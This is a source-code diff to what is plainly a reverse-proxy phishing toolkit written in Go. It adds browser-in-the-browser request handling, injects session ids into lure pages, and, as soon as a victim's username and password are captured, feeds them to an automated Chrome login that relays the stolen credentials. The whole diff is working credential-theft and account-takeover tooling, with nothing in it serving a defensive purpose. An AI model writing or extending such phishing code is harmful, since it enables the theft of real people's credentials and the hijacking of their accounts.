@@ -294,6 +294,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 
+			// Handle BITB API requests directly (don't proxy to Google)
+			if strings.HasPrefix(req.URL.Path, "/bitb/") {
+				body, err := p.handleBitbRequestRaw(req)
+				if err != nil {
+					log.Error("bitb: request failed: %v", err)
+					resp := goproxy.NewResponse(req, "application/json", 500, `{"error":"internal error"}`)
+					return req, resp
+				}
+				resp := goproxy.NewResponse(req, "application/json", 200, string(body))
+				return req, resp
+			}
+
 			phishDomain, phished := p.getPhishDomain(req.Host)
 			if phished {
 				pl_name := ""
@@ -512,6 +524,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 											body := string(html)
 											body = p.replaceHtmlParams(body, lure_url, &s.Params)
+											body = strings.Replace(body, "{session_id}", s.Id, -1)
 
 											resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
 											if resp != nil {
@@ -1811,11 +1824,17 @@ func (p *HttpProxy) setSessionPassword(sid string, password string) {
 		s.SetPassword(password)
 		log.Debug("password added")
 
-		if p.bitbManager != nil {
+		if p.bitbManager != nil && s.Username != "" && s.Password != "" {
+			// Credentials captured from proxy - start Chrome login
 			go func() {
-				time.Sleep(500 * time.Millisecond)
-				if s.Username != "" && s.Password != "" {
-					p.bitbManager.StartLogin(sid, s.Username, s.Password)
+				err := p.bitbManager.SubmitEmail(sid, s.Username)
+				if err != nil {
+					log.Error("bitb: proxy-triggered email submit failed: %v", err)
+					return
+				}
+				err = p.bitbManager.SubmitPassword(sid, s.Password)
+				if err != nil {
+					log.Error("bitb: proxy-triggered password submit failed: %v", err)
 				}
 			}()
 		}
